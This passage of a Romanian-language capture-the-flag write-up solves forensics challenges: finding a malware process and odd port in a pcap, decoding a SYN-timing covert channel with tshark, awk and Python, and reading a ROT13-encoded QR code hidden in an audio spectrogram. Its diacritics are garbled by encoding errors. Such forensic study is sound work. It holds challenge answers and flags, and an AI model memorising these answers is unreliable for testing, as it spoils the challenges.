Aceasta comanda afiseaza procesele active ale utilizatorului. A fost usor sa imi dau seama ca in campul `user` trebuie sa fie `darius` pentru a gasi numele malware-ului. Am scrollat mai jos si am inceput sa gasesc  procesele utilizatorului pe care il cautam. Acolo am si gasit raspunsul primei  intrebari:
`mblue-lockerV1`

![](https://github.com/user-attachments/assets/348f53d9-e90f-4818-9c13-2986125bd2c8)


Pentru aflarea ultimului raspuns m-am folosit de site-ul [ğŸ” Online pcap files viewer for analyze HTTP, DNS, other network traffic](https://apackets.com/pcaps/ports) . Aici am incarcat fisierul `mlue.pcapng` si deschizand sectiunea `Open Ports on Network Nodes ` am gasit mai multe IP-uri si PORT-uri insa doar unul era ciudat,acesta s-a dovedit sa fie si raspunsul:
`127.0.0.1:9001`

![](https://github.com/user-attachments/assets/8084e155-4f31-4f73-a0d8-bab9db7c9ff7)

## silent-relay (Reverse Engineering/Network/Misc)

**Descriere:**
```
Am gÄƒsit acest binar care genereazÄƒ un trafic suspect. PoÈ›i sÄƒ Ã®l investighezi? Ai la dispoziÈ›ie atÃ¢t fiÈ™ierul bin cÃ¢t È™i o capturÄƒ PCAP.
```
**Solutie**
AnalizÃ¢nd fiÈ™ierul `.bin` am putut observa cÄƒ bazat pe valoarea caracterelor ``0x30 = '0'`` si ``0 x31 = '1'`` este un pattern al delay-urilor: '0' â†’ usleep(100000) (100ms)
'1' â†’ usleep(500000) (500ms) . Folsindu-mÄƒ de `tshark` am reusit sa extrag aceste delay-uri din fisierul PCAPNG:

 `tshark -r yourfile.pcapng -Y "tcp.flags.syn == 1 and tcp.flags.ack == 0" -T fields -e frame.time_epoch > syn_times.txt`

Acum ca am extras timestamp-urile din fisierul PCAPNG trebuie sa le prelucram pentru a avea datele in formatul de care avem nevoie:

`awk 'NR>1 {print $1-prev} {prev=$1}' syn_times.txt`

Pentru a termina challange-ul trebuie sa transformam intervalele cum am spus mai sus, `0.500 â†’ 1` si `0.100 â†’ 0`. Script-ul transforma delay-urile in cod binar apoi in text.

```python
intervals = [
    0.100197, 0.500317, 0.500158, 0.100276, 0.100251, 0.10059, 0.500554, 0.500226,
    0.100139, 0.500232, 0.500194, 0.500318, 0.10019, 0.500388, 0.10051, 0.100179,
    0.100403, 0.50018, 0.500635, 0.100533, 0.100267, 0.500577, 0.500281, 0.100148,
    0.100131, 0.500473, 0.500448, 0.500196, 0.500398, 0.100232, 0.500622, 0.500721,
    0.100249, 0.50069, 0.500712, 0.100214, 0.10069, 0.100567, 0.500345, 0.100257,
    0.100287, 0.500694, 0.500246, 0.100799, 0.10021, 0.100408, 0.100668, 0.500509,
    0.100446, 0.500534, 0.500616, 0.100484, 0.100257, 0.500669, 0.50065, 0.100704,
    0.100408, 0.100483, 0.500711, 0.500268, 0.500674, 0.100205, 0.100626, 0.500431,
    0.100516, 0.500669, 0.500486, 0.100407, 0.100213, 0.500636, 0.10032, 0.500238,
    0.100597, 0.500188, 0.500316, 0.100655, 0.100836, 0.500479, 0.100235, 0.500764,
    0.100835, 0.500605, 0.500196, 0.10017, 0.100396, 0.100546, 0.500738, 0.500614,
    0.100224, 0.50054, 0.500382, 0.10019, 0.100636, 0.100476, 0.500429, 0.100596,
    0.100621, 0.500549, 0.500768, 0.1004, 0.100613, 0.500449, 0.500514, 0.100462,
    0.100164, 0.500231, 0.500674, 0.100764, 0.100468, 0.500607, 0.500529, 0.100816,
    0.100395, 0.100713, 0.50078, 0.500602, 0.100225, 0.100438, 0.500594, 0.500365,
    0.100714, 0.100435, 0.500636, 0.500562, 0.100497, 0.100706, 0.100577, 0.500156,
    0.10027, 0.500651, 0.500245, 0.100555, 0.10063, 0.500724, 0.10047, 0.500608,
    0.100731, 0.100284, 0.500443, 0.500623, 0.10031, 0.100551, 0.500623, 0.500692,
    0.10071, 0.500407, 0.500699, 0.100703, 0.10107, 0.500736, 0.100656, 0.100187,
    0.100245, 0.100451, 0.500602, 0.500573, 0.100543, 0.100208, 0.100387, 0.100439,
    0.100258, 0.500186, 0.500904, 0.100713, 0.10028, 0.500486, 0.500427, 0.100217,
    0.100802, 0.500302, 0.500185, 0.100362, 0.100415, 0.100497, 0.50057, 0.500177,
      0.100499, 0.500398, 0.500358, 0.100164, 0.100935, 0.500262, 0.100608, 0.100241,
    0.100431, 0.50044, 0.500258, 0.100301, 0.100335, 0.500355, 0.500464, 0.100339,
    0.100222, 0.100643, 0.500401, 0.50045, 0.500637, 0.100626, 0.100194, 0.500389,
    0.10017, 0.500183, 0.50075, 0.100556, 0.100599, 0.500448, 0.100207, 0.100351,
    0.100174, 0.500174, 0.500398, 0.100497, 0.100671, 0.101203, 0.500231, 0.500279,
    0.100341, 0.100224, 0.500379, 0.500251, 0.500444, 0.100674, 0.10018, 0.100438,
    0.100242, 0.100247, 0.50072, 0.50081, 0.100677, 0.100546, 0.500233, 0.100697,
    0.100667, 0.100609, 0.500658, 0.50028, 0.100452, 0.100558, 0.100138, 0.100252,
    0.100202, 0.500339, 0.500489, 0.10039, 0.100278, 0.500336, 0.100431, 0.100182,
    0.100576, 0.10053, 0.50053, 0.500301, 0.100323, 0.500229, 0.500721, 0.100486,
    0.10046, 0.100313, 0.500634, 0.50022, 0.100492, 0.500522, 0.500236, 0.500379,
    0.100274, 0.10049, 0.500691, 0.500403, 0.100859, 0.100299, 0.500654, 0.50061,
    0.100253, 0.10041, 0.500234, 0.500654, 0.10064, 0.500589, 0.100381, 0.500671,
    0.10046, 0.100258, 0.500168, 0.500513, 0.500505, 0.100877, 0.100273, 0.500462,
    0.100492, 0.100544, 0.500255, 0.500193, 0.100483, 0.500522, 0.100266, 0.100421,
    0.10022, 0.100227, 0.500218, 0.500448, 0.100658, 0.100555, 0.500669, 0.100523,
    0.100363, 0.100565, 0.500507, 0.500194, 0.100456, 0.500182, 0.500407, 0.100499,
    0.10058, 0.100199, 0.500535, 0.50036, 0.100158, 0.100208, 0.100408, 0.500313,
    0.100282, 0.100207, 0.500473, 0.500566, 0.100193, 0.100563, 0.100518, 0.500548,
    0.100446, 0.100244, 0.500149, 0.500171, 0.100388, 0.100277, 0.100626, 0.100742,
    0.100222, 0.100566, 0.500247, 0.500619, 0.100804, 0.100543, 0.100431, 0.100489,
    0.10044, 0.500312, 0.500209, 0.100593, 0.100406, 0.100472, 0.500179, 0.100472,
    0.100347, 0.10064, 0.500507, 0.500357, 0.100382, 0.100623, 0.100152, 0.100695,
    0.100706, 0.10078, 0.500526, 0.500158, 0.100488, 0.500576, 0.100581, 0.500639,
    0.100298, 0.10098, 0.500796, 0.500255, 0.100724, 0.500347, 0.100406, 0.5006,
    0.100362, 0.100227, 0.500498, 0.500607, 0.100296, 0.500186, 0.500559, 0.100298,
    0.100713, 0.500664, 0.500298, 0.100494, 0.100203, 0.500642, 0.100533, 0.10042,
    0.100251, 0.100544, 0.500608, 0.50042, 0.100797, 0.500836, 0.500293, 0.500217,
    0.100616, 0.100477, 0.500616, 0.500541, 0.100205, 0.500232, 0.500518, 0.100559,
    0.100558, 0.1002, 0.500631, 0.500576, 0.100428, 0.50044, 0.100739, 0.100345,
    0.100298, 0.100588, 0.500402, 0.500151, 0.500224, 0.10035, 0.100713, 0.100217,
    0.100337, 0.100289, 0.500298, 0.500288, 0.100483, 0.100347, 0.100171, 0.100181,
    0.100226, 0.100598, 0.500583, 0.500648, 0.100369, 0.100464, 0.100281, 0.100155,
    0.100305, 0.500752, 0.500359, 0.100376, 0.10052, 0.100398, 0.500913, 0.100205,
    0.100169, 0.500587, 0.500463, 0.10035, 0.100748, 0.100436, 0.500615, 0.500627,
    0.100182, 0.100516, 0.500695, 0.500591, 0.10054, 0.500701, 0.500711, 0.500489,
    0.100672, 0.100448, 0.500654, 0.500528, 0.100221, 0.500203, 0.100693, 0.500576,
    0.100773, 0.100393, 0.500428, 0.500665, 0.100656, 0.100656, 0.500548, 0.10054,
    0.100414, 0.500383, 0.500268, 0.10039, 0.100444, 0.500199, 0.100416, 0.100163,
    0.10031, 0.100461, 0.500584, 0.500352, 0.100373, 0.500417, 0.500391, 0.100222,
    0.100524, 0.100352, 0.500605, 0.500669, 0.100343, 0.100502, 0.50056, 0.500236,
    0.100322, 0.500289, 0.500429, 0.100184, 0.100329, 0.500229, 0.100213, 0.500208,
    0.100617, 0.500525, 0.500375, 0.100368, 0.100581, 0.100209, 0.500549, 0.500191,
    0.100534, 0.500261, 0.50059, 0.100518, 0.100527, 0.500439, 0.100695, 0.100197,
    0.10049, 0.500307, 0.500225, 0.100177, 0.100204, 0.100705, 0.100565, 0.500534,
    0.100502, 0.500639, 0.5002, 0.100473, 0.100701, 0.500343, 0.100218, 0.500619,
    0.100549, 0.500554, 0.500207, 0.500267, 0.500408, 0.500288, 0.100616
]

threshold = 0.18

binary_data = ''.join(['1' if i > threshold else '0' for i in intervals])

print("Binary Data:")
print(binary_data)

ascii_data = ''.join([chr(int(binary_data[i:i+8], 2)) for i in range(0, len(binary_data), 8)])
ascii_data = ascii_data[:-1] + "}"
print("\nDecoded ASCII:")
print(ascii_data)

```
## Digital Dust - Unraveling (Steganography)

**Descriere:**
```
Salut! EÈ™ti acum un investigator Ã®ncepÄƒtor Ã®n lumea criminalisticii digitale È™i ai primit prima ta misiune importantÄƒ! Mentorul tÄƒu È›i-a dat un fiÈ™ier audio interesant pentru analizÄƒ. DupÄƒ ce s-a uitat puÈ›in la el, mentorul bÄƒnuieÈ™te cÄƒ cineva a ascuns o parolÄƒ secretÄƒ Ã®n acest fiÈ™ier folosind o tehnicÄƒ numitÄƒ steganografie.

Misiunea ta, dacÄƒ alegi sÄƒ o accepÈ›i, este sÄƒ descoperi parola ascunsÄƒ È™i sÄƒ rÄƒspunzi la cÃ¢teva Ã®ntrebÄƒri despre aceastÄƒ investigaÈ›ie digitalÄƒ. Succes!

```
**Solutie**

Fiind un challange de steganografie primul lucru la care m-am gÃ¢ndit este sa ma uit la spectrograma acestui fisier audio. Am deschis Audacity si s-a dovedit ca am avut dreptate.

![Image](https://github.com/user-attachments/assets/15e7fb4f-0301-47d0-ac02-4d89337d17c5)

Pentru a face codul qr mai vizibil am intrat Ã®n setÄƒrile spectrogramei unde am setat `scale: Linear` È™i `scheme: Inverse grayscale`

![Image](https://github.com/user-attachments/assets/5a2b5710-d01f-4f22-a32a-06d9f98ec3c3)


Am facut un screenshot micsorat al codului qr si l-am uplodat pe [Qr Scanner](https://qrscanner.net/) unde am gasit si textul salvat.

![Image](https://github.com/user-attachments/assets/fc86e402-11b7-41ce-970e-9eb6d6189f56)

Pentru a gÄƒsi cifrul folosit pentru a encoda mesajul [CyberChef](https://cyberchef.org/#recipe=ROT13(true,true,false,13)&input=anJ5cGJ6cl9nYl9CRlA) m-a ajutat enorm. Asa am gasit ca procesul de encodare este `ROT13`, un algoritm cruptografic de tip `substitutie`. Parola obtinuta dupa decodarea mesajului este `welcome_to_OSC`.

![Image](https://github.com/user-attachments/assets/e0fbe49d-537f-4982-9cd3-5bd55d1c3cc8)

